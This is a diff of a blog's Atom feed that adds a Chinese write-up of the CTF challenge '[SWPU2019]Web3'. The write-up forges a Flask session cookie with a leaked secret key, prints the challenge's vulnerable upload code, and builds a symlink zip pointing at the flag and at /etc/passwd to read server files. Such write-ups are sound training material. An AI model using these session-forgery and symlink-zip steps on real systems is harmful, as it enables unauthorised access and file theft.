@@ -3,7 +3,7 @@
     <id>http://odiws.github.io</id>
     <title>Hexo • Posts by &#34;flask的session伪造&#34; tag</title>
     <link href="http://odiws.github.io" />
-    <updated>2024-08-23T13:06:15.000Z</updated>
+    <updated>2024-10-15T08:32:39.000Z</updated>
     <category term="buuctf" />
     <category term="system_file" />
     <category term="sql文件读取" />
@@ -107,6 +107,129 @@
     <category term="sqlע��" />
     <category term="jwt身份验证" />
     <category term="rc4" />
+    <category term="CRLF" />
+    <category term="任意文件读取" />
+    <category term="PDO堆叠注入" />
+    <category term="test" />
+    <category term="tag2" />
+    <entry>
+        <id>http://odiws.github.io/2024/10/15/SWPU2019-Web3/</id>
+        <title>[SWPU2019]Web3</title>
+        <link rel="alternate" href="http://odiws.github.io/2024/10/15/SWPU2019-Web3/"/>
+        <content type="html">&lt;h2 id=&#34;swpu2019web3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#swpu2019web3&#34;&gt;#&lt;/a&gt; [SWPU2019]Web3&lt;/h2&gt;
+&lt;p&gt;F12 发现可疑 session：&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/web3/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
+&lt;p&gt;用一些解密 session 的脚本运行：（flask-unsign（无需密钥），flask_session_cookie_manager (需要密钥)）&lt;/p&gt;
+&lt;p&gt;得到：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;#123;&#39;id&#39;: b&#39;100&#39;, &#39;is_login&#39;: True, &#39;password&#39;: &#39;admin&#39;, &#39;username&#39;: &#39;admin&#39;&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;怀疑是 id 的原因，不能 upload（可以怀疑是 linux 的 uid，将其改成 1）&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;#123;&#39;id&#39;: b&#39;1&#39;, &#39;is_login&#39;: True, &#39;password&#39;: &#39;admin&#39;, &#39;username&#39;: &#39;admin&#39;&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;ctrl+u 发现访问不存在的目录有东西，访问后有个 base64 解码&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;secretkey：keyqqqwwweee!@#$%^&amp;amp;*
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;加密&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#加密&#34;&gt;#&lt;/a&gt; 加密：&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&#34;language-pyhton&#34;&gt;python flask_session_cookie_manager3.py encode -s &amp;quot;keyqqqwwweee!@#$%^&amp;amp;*&amp;quot; -t &amp;quot;&amp;#123;&#39;id&#39;: b&#39;1&#39;, &#39;is_login&#39;: True, &#39;password&#39;: &#39;admin&#39;, &#39;usern
+ame&#39;: &#39;admin&#39;&amp;#125;&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;注意必须是双引号&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#注意必须是双引号&#34;&gt;#&lt;/a&gt; 注意：必须是双引号&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;.eJyrVspMUbKqVlJIUrJS8g20tVWq1VHKLI7PyU_PzFOyKikqTdVRKkgsLi7PLwIqVEpMyQWK6yiVFqcW5SXmpsKFagFiyxgX.Zw4qow.vmpZTSGoPFjEWa3pCDPZiEykuks
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;修改后源代码里面有源码：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;@app.route(&#39;/upload&#39;,methods=[&#39;GET&#39;,&#39;POST&#39;])
+def upload():
+    if session[&#39;id&#39;] != b&#39;1&#39;:
+        return render_template_string(temp)
+    if request.method==&#39;POST&#39;:
+        m = hashlib.md5()
+        name = session[&#39;password&#39;]
+        name = name+&#39;qweqweqwe&#39;
+        name = name.encode(encoding=&#39;utf-8&#39;)
+        m.update(name)
+        md5_one= m.hexdigest()
+        n = hashlib.md5()
+        ip = request.remote_addr
+        ip = ip.encode(encoding=&#39;utf-8&#39;)
+        n.update(ip)
+        md5_ip = n.hexdigest()
+        f=request.files[&#39;file&#39;]
+        basepath=os.path.dirname(os.path.realpath(__file__))
+        path = basepath+&#39;/upload/&#39;+md5_ip+&#39;/&#39;+md5_one+&#39;/&#39;+session[&#39;username&#39;]+&amp;quot;/&amp;quot;
+        path_base = basepath+&#39;/upload/&#39;+md5_ip+&#39;/&#39;
+        filename = f.filename
+        pathname = path+filename
+        if &amp;quot;zip&amp;quot; != filename.split(&#39;.&#39;)[-1]:
+            return &#39;zip only allowed&#39;
+        if not os.path.exists(path_base):
+            try:
+                os.makedirs(path_base)
+            except Exception as e:
+                return &#39;error&#39;
+        if not os.path.exists(path):
+            try:
+                os.makedirs(path)
+            except Exception as e:
+                return &#39;error&#39;
+        if not os.path.exists(pathname):
+            try:
+                f.save(pathname)
+            except Exception as e:
+                return &#39;error&#39;
+        try:
+            cmd = &amp;quot;unzip -n -d &amp;quot;+path+&amp;quot; &amp;quot;+ pathname
+            if cmd.find(&#39;|&#39;) != -1 or cmd.find(&#39;;&#39;) != -1:
+				waf()
+                return &#39;error&#39;
+            os.system(cmd)
+        except Exception as e:
+            return &#39;error&#39;
+        unzip_file = zipfile.ZipFile(pathname,&#39;r&#39;)
+        unzip_filename = unzip_file.namelist()[0]
+        if session[&#39;is_login&#39;] != True:
+            return &#39;not login&#39;
+        try:
+            if unzip_filename.find(&#39;/&#39;) != -1:
+                shutil.rmtree(path_base)
+                os.mkdir(path_base)
+                return &#39;error&#39;
+            image = open(path+unzip_filename, &amp;quot;rb&amp;quot;).read()
+            resp = make_response(image)
+            resp.headers[&#39;Content-Type&#39;] = &#39;image/png&#39;
+            return resp
+        except Exception as e:
+            shutil.rmtree(path_base)
+            os.mkdir(path_base)
+            return &#39;error&#39;
+    return render_template(&#39;upload.html&#39;)
+
+
+@app.route(&#39;/showflag&#39;)
+def showflag():
+    if True == False:
+        image = open(os.path.join(&#39;./flag/flag.jpg&#39;), &amp;quot;rb&amp;quot;).read()
+        resp = make_response(image)
+        resp.headers[&#39;Content-Type&#39;] = &#39;image/png&#39;
+        return resp
+    else:
+        return &amp;quot;can&#39;t give you&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;定义两个路由，上传的那个路由就是上传一个压缩的图片，服务器进行解压再显示图片，我们这里可上传一个软连接压缩包，来读取其他文件，showflag 路由告诉我们 flag.jpg 放在 flask 根目录的 flag 目录下&lt;/p&gt;
+&lt;p&gt;构造 payload&lt;/p&gt;
+&lt;p&gt;ln -s 是 Linux 的一种软连接，类似与 windows 的快捷方式&lt;br&gt;
+ ln -s /etc/passwd forever404 这会出现一个 forever404 文本，里面包含密码&lt;br&gt;
+ /proc/self 记录了系统运行的信息状态等，cwd 指向当前进程运行目录的一个符号链接，即 flask 运行进程目录&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;ln -s /proc/self/cwd/flag/flag.jpg test
+zip -ry test.zip test
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/web3/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
+&lt;p&gt;将该文件上传获取 flag：&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/web3/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
+</content>
+        <category term="buuctf" />
+        <category term="flask的session伪造" />
+        <updated>2024-10-15T08:32:39.000Z</updated>
+    </entry>
     <entry>
         <id>http://odiws.github.io/2024/08/23/CISCN2019%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Web4/</id>
         <title>[CISCN2019华东南赛区]Web4</title>
